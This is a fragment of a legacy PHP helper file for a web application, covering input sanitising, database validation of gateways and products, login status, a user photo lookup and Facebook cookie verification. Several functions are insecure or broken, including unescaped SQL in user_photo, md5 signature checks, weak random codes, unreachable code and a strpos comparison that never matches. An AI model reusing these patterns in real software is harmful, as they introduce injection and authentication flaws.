						 "-","_","+","=","{}","{","}","|",",",".","<",">",
						 "?",":","'",'"', '""',";",'/');
	$cleaned = str_replace($bannedchars, "", $str);
	return $cleaned;
}

function validate_item_gwid($item,$cid,$gwid) 
{
	global $cnfg, $db;
	
	$p = (int)$db->escape( escape( no_special_chars( $item ) ) );
	$g = (int)$db->escape( escape ( no_special_chars( $gwid ) ) );
	$c = (int)$db->escape( escape ( no_special_chars( $cid ) ) );
	
	if ($g>0) {
		$rs = $db->squeryf("SELECT gw FROM gateway WHERE gw=$g");
		$fs = $db->fetch_array($rs);
		if ($fs['gw']){
			$r = $db->squeryf("SELECT pid FROM product WHERE pid=$p");
			$f = $db->fetch_array($r);
			if($f['pid']){
				$cs = $db->squeryf("SELECT cid  FROM categories WHERE cid=$c");
				$cr = $db->fetch_array($cs);
				if ($cr['cid']) {
					return true;
				} else {
					$_SESSION['reason'] = "Category not found.";
				}					
			} else {
				$_SESSION['reason']="Item not found.";
			}
			
		} else {
			$_SESSION['reason'] = "No network.";
		}
	} else {
		return false;
		$_SESSION['reason'] = "Network not found.";
	}
}

function detect_ie()
{
    if (isset($_SERVER['HTTP_USER_AGENT']) && 
    (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== false))
        return true;
    else
        return false;
}



function getUniqueCode($length = 0)
{	
	$code = md5(uniqid(rand(), true));
	if ($length != 0 AND $length < 32){
		return substr($code, 0, $length);
	} elseif ( $length > 32 ) {
		return vcharf($length);
	} else {
		return $code;
	}
}

function go_home() {
	header('Location: ' . URL);
}

function clearBrowserCache() {
   header("Pragma: no-cache");
   header("Cache: no-cache");
   header("Cache-Control: no-cache, must-revalidate");
   header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
}

/**
 * Here's a simple function I wrote for parsing form data. It checks if it's an array and
 *  it is recursive (it calls itself). It also decodes things that have already been encoded 
 *  so it doesn't change &amp; to &amp;amp; [In this version,] I found it  easier to use a 
 *  regular expression to check and see if any previously encoded data exists, then decode 
 *  it repeatedly until there is none left, then re-encode it. 
 */
function formspecialchars($var) 
{
	$pattern = '/&(#)?[a-zA-Z0-9]{0,};/'; 
	if (is_array($var)) {    // If variable is an array 
    	$out = array();      // Set output as an array 
    	foreach ($var as $key => $v) {      
        	$out[$key] = formspecialchars($v); 
			// Run formspecialchars on every element of the array and return the result. Also maintains the keys. 
    	} 
	} else { 
		$out = $var; 
    	while (preg_match($pattern,$out) > 0) { 
    		$out = htmlspecialchars_decode($out,ENT_QUOTES);       
    	}
    	$out = htmlspecialchars(stripslashes(trim($out)), ENT_QUOTES,'UTF-8',true); // Trim the variable, strip all slashes, and encode it 
	} 
	/*	$needle_in_haystack = strpos($out,"'");
	if ($needle_in_haystack == true) {
		$out = str_replace("'","&apos;",$out);
	} */
	return $out; 
}

// Short Simple and to the point
function login_status (){
	if (!empty($_SESSION['u'])) {
		$status = true;
	} elseif (!empty($_SESSION['u']) && !empty($_SESSION['fb_uid'])) {
		$status = true;
	} elseif (empty($_SESSION)) {
		$status = false;
	}
	return $status;
}


function user_photo () {
	global $cnfg, $con;
	// Begin checking for user photo if there are NO FB or Twitter Sessions
	if (!empty($_SESSION['u']) && empty($_SESSION['fb_uid']) && empty($_SESSION['uid'])) {
		// Only check for a user photo if the user is logged on because this will throw a sql error if there is no user var
		if (!empty($_SESSION['u'])) {
			$u = $_SESSION['u'];			
			$query_str = "SELECT photo FROM users WHERE u=$u";
			$sql = mysql_query($query_str, $con);
			$fs = mysql_fetch_array($sql);
			// Assign the photo path to a variable if the array is not empty
			if (!empty($fs['photo'])) {
				$file = basename($fs['photo']);
				return $file;
			} 
		}
	}
	
}

function menu_extract($str) {
	$needle = 'Please Select';
	$find = strpos($str,$needle);
	if ($find === true) {
		$string = '';
	} else {
		$string = $str;
	}
	return $string;
}

/* Twitter API related functions and Twitter Oauth functionality */
function Twitter_obj_toArray($object)
{
    $array = array();
    foreach ($object as $key => $value) {
        if ($value instanceof TwitterOAuth) {
            $array[$key] = toArray($object);
        } else {
            $array[$key] = $value;
        }
    }
    return $array;
}

/* FACEBOOK Functions and Related Functionality */
function get_facebook_cookie($app_id, $application_secret) {
  $args = array();
  parse_str(trim($_COOKIE['fbs_' . $app_id], '\\"'), $args);
  ksort($args);
  $payload = '';
  foreach ($args as $key => $value) {
    if ($key != 'sig') {
      $payload .= $key . '=' . $value;
    }
  }
  if (md5($payload . $application_secret) != $args['sig']) {
    return null;
  }
  return $args;
}

